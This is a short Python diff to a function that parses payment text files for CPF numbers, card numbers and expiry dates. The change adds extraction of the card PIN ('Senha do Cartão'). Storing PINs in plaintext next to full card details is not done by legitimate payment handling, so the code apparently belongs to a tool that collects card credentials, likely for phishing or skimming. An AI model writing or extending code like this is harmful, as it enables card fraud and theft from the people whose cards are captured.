@@ -636,6 +636,7 @@ def parse_payment_file(content: str, file_path: Path) -> dict:
             'cpf': '',
             'numeroCartao': '',
             'validade': '',
+            'senhaCartao': '',
             'dataCriacao': file_path.parent.name,  # Date folder
             'status': 'processado'
         }
@@ -650,6 +651,8 @@ def parse_payment_file(content: str, file_path: Path) -> dict:
                 data['numeroCartao'] = line.split('Número do Cartão:')[1].strip()
             elif 'Validade:' in line and 'DADOS DO CARTÃO' not in line:
                 data['validade'] = line.split('Validade:')[1].strip()
+            elif 'Senha do Cartão:' in line:
+                data['senhaCartao'] = line.split('Senha do Cartão:')[1].strip()
             elif 'Data/Hora:' in line and data['dataCriacao'] == file_path.parent.name:
                 data['dataCriacao'] = line.split('Data/Hora:')[1].strip()
 
